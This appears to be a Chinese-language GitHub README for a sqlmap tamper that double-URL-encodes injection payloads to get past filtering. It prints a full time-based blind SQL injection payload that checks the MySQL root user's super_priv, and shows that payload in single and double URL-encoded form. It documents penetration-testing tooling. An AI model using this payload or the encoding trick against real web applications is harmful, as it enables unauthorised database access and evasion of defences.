# Sqlmap-DoubleUrlencode-tamper
DoubleUrlencode for sqlmap tamper

在一次渗透测试过程中，遇到了两次Url编码的案例，因此改了一个简单的tamper

# Quoete()
* 传入参数类型：字符串
* 功能：将单个字符串编码转化为 %xx 的形式
* 导入：from urllib.parse import quote
* Ps：url多个字符串编码用urlenocde()函数
## test
* payload: ' AND (SELECT 2634 FROM (SELECT(SLEEP(2-(IF((SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))=1,0,2)))))aoEO) AND 'OpQi'='OpQi

sqlmap自带的urlencode效果
![image](https://user-images.githubusercontent.com/100123029/155446733-faa153e7-a949-4778-89d6-e90b7e5466de.png)

* urlencode：/%27%20AND%20%28SELECT%202634%20FROM%20%28SELECT%28SLEEP%282-%28IF%28%28SELECT%20%28CASE%20WHEN%20%28%28SELECT%20super_priv%20FROM%20mysql.user%20WHERE%20user%3D0x726f6f74%20LIMIT%200%2C1%29%3D0x59%29%20THEN%201%20ELSE%200%20END%29%29%3D1%2C0%2C2%29%29%29%29%29aoEO%29%20AND%20%27OpQi%27%3D%27OpQi

* doubleurlencode：%25%32%37%25%32%30%41%4e%44%25%32%30%25%32%38%53%45%4c%45%43%54%25%32%30%32%36%33%34%25%32%30%46%52%4f%4d%25%32%30%25%32%38%53%45%4c%45%43%54%25%32%38%53%4c%45%45%50%25%32%38%32%2d%25%32%38%49%46%25%32%38%25%32%38%53%45%4c%45%43%54%25%32%30%25%32%38%43%41%53%45%25%32%30%57%48%45%4e%25%32%30%25%32%38%25%32%38%53%45%4c%45%43%54%25%32%30%73%75%70%65%72%5f%70%72%69%76%25%32%30%46%52%4f%4d%25%32%30%6d%79%73%71%6c%2e%75%73%65%72%25%32%30%57%48%45%52%45%25%32%30%75%73%65%72%25%33%44%30%78%37%32%36%66%36%66%37%34%25%32%30%4c%49%4d%49%54%25%32%30%30%25%32%43%31%25%32%39%25%33%44%30%78%35%39%25%32%39%25%32%30%54%48%45%4e%25%32%30%31%25%32%30%45%4c%53%45%25%32%30%30%25%32%30%45%4e%44%25%32%39%25%32%39%25%33%44%31%25%32%43%30%25%32%43%32%25%32%39%25%32%39%25%32%39%25%32%39%25%32%39%61%6f%45%4f%25%32%39%25%32%30%41%4e%44%25%32%30%25%32%37%4f%70%51%69%25%32%37%25%33%44%25%32%37%4f%70%51%69

* BP 
![image](https://user-images.githubusercontent.com/100123029/155447021-079fb7df-962c-4fcf-9be0-7e383a3918b1.png)

* test.py
![image](https://user-images.githubusercontent.com/100123029/155448429-8c361ae5-c4bb-4b40-8167-090dbe0a09c4.png)

* tamper
![image](https://user-images.githubusercontent.com/100123029/155448629-4f26eacd-918d-48df-b6d3-5ce2e506306f.png)

* 效果
![image](https://user-images.githubusercontent.com/100123029/155449152-7d2bb427-abe0-4290-9675-5cb0570ce86f.png)
# 学习记录
